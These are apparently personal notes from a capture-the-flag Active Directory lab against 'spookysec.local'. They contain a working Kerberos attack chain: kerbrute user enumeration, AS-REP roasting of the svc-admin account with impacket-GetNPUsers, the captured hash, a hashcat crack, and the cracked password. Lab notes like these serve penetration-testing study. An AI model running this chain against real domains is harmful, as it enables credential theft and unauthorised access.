`/opt/binaries/kerbrute/kerbrute userenum --dc spookysec.local -d spookysec.local /usr/share/wordlists/active-directory/userlist.txt -t 50`

![[Pasted image 20210601153842.png]]

`impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 
10.10.121.26 -request`

`$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:8816586eb4d93a693f150aed21b3646f$563ab87b5523728012c15b78104b2ad6f21c4cdc7db1b0a1f552d4914c450e88e4caed69c182e7a0a55e00e51e62993c4abfd5516032dc134f3b28bfb2f0c7ae8300f427e8b8eb49b02204b9fa159abfd6d77245eb040b6a2ffd481777c77d42a80fea107f1133e55d43400cfc7e7d19d3466344a9049d3beff93b766ace644ca9901b0f83d9a1203e7c3d2b6820dfa1aed348c172661f22b2ba5987f432c0ab3e8e41f2e2661e6e6b679f19aa3b6c39e27d1f4a1ba560e2043be5d47a88a2c12f8a256b9351624ce1894bf523664e28e02a70f023a215b8da060d91c48a1f20eeb5f667ed7666143e3d8df801fd7ef61552`

![[Pasted image 20210601154307.png]]

![[Pasted image 20210601154414.png]]

`hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt`
`management2005`
![[Pasted image 20210601154601.png]]
